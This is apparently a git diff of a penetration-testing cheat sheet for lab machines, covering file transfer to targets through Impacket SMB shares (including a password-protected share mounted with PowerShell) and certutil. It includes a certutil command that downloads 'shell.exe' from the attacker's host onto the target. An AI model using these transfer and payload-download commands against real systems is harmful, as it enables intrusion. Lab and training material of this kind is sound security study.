@@ -245,10 +245,10 @@ tail -f /var/log/samba/log.<site-name>
 ## Impacket SMB
 
 ```bash
-impacket-smbserver -ip 10.10.14.4 -smb2support gorilla /var/www/html/pub
+impacket-smbserver -ip 10.10.14.4 -smb2support bullsec /var/www/html/pub
 ```
 
-Then use `\\10.10.14.4\gorilla\<file-name>` as the location to send your file from, or to have the target grab from you.
+Then use `\\10.10.14.4\bullsec\<file-name>` as the location to send your file from, or to have the target grab from you.
 
 Mounting a remote share is pretty simple as well assuming you know the name of the share:
 
@@ -260,9 +260,32 @@ mount -t cifs //10.10.10.123/general /mnt/10.10.10.123
 
 Now we can browse the share inside our terminal.
 
+### Impacket SMB w/ Password
+
+```bash
+# Create the SMB Share
+impacket-smbserver bullShare $(pwd) -smb2support -user bullsec -password SecurePassword
+```
+
+```powershell
+# Create a Credential Object
+$pass = convertto-securestring 'SecurePassword' -asplain -force
+$cred = new-object system.management.automation.pscredential("htb\bullsec", $pass)
+```
+
+```powershell
+# Connect to the Share
+New-PSDrive -Name bullsec -PSProvider FileSystem -Credential $cred -Root \\10.10.14.3\bullShare
+```
+
+```powershell
+# Browse the Share
+cd bullShare:
+```
+
 ## certutil
 
-Genuinely forget that this is a thing. If you're on a Windows machine then this may be a viable option for transferring files from our host system to the target:
+Genuinely forget that this is a thing most of the time but it's such a useful tool. If you're on a Windows machine then this may be a viable option for transferring files from our host system to the target:
 
 ```bash
 certutil -urlcache -f “http://10.10.14.14/shell.exe” shell.exe
